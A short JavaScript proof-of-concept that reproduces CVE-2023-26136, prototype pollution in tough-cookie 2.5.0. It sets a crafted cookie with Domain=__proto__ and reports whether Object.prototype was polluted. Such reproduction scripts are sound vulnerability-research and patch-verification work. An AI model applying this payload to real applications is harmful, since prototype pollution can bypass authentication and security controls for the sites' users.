// Exploit demonstration for CVE-2023-26136 in tough-cookie 2.5.0
// This vulnerability allows prototype pollution through cookie path attribute
// Potential damage: Attackers can modify Object.prototype to inject malicious properties
// that affect all objects in the application, potentially leading to:
// - Authentication bypass
// - Security control circumvention
// - Remote code execution in some cases

const tough = require('./lib/cookie');

function testExploit() {
    const jar = new tough.CookieJar(undefined, {
        rejectPublicSuffixes: false
      });
    
    // Attempt to pollute Object.prototype via cookie path
    jar.setCookie(
        'malicious=value; Domain=__proto__; Path=/polluted',
        'https://__proto__/admin',
        {},
        (err1) => {
            if (err1) {
                console.log('EXPLOIT FAILED');
                return;
            }

            // Test if pollution worked
            const testObj = {};
            if (testObj["/polluted"] !== undefined) {
                console.log('EXPLOITED SUCCESSFULLY');
                console.log('Prototype has been polluted:', testObj.polluted);
            } else {
                console.log('EXPLOIT FAILED');
            }
        }
    );
}

testExploit();